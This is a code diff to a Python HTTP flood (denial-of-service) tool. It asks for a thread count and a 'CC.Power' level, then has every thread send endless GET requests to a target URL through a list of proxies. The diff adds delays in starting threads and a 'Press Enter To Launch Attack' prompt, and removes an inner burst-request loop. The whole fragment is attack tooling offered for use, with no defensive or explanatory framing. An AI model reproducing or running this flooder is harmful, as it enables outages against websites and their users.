@@ -1,5 +1,6 @@
 import requests
 import sys
+import time
 import random
 from threading import Thread
 from colorama import Fore
@@ -58,8 +59,12 @@ def main():
 	pow = int(input(Fore.YELLOW + "CC.Power (1-100) :" + Fore.WHITE))
 	for x in range(thr):
 		x = Thread(target=atk, name=(x))
+		time.sleep(0.01)
 		x.start()
-
+	print("Wait A Few Seconds For Threads Ready To Attack . . .")
+	time.sleep(3)
+	input("Press Enter To Launch Attack !")
+	
 def atk():
 	while True:
 		pprr = open(list).readlines()
@@ -71,11 +76,6 @@ def atk():
 		try:
 			s.get(url)
 			print(Fore.GREEN + "From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " Target-> " + Fore.WHITE + str(url))
-			try:
-				for y in range(pow):
-					s.get(url)
-			except:
-				s.close()
 		except:
 			s.close()
 			print(Fore.RED + "[!]Couldn't Connect To Proxy" + Fore.WHITE)
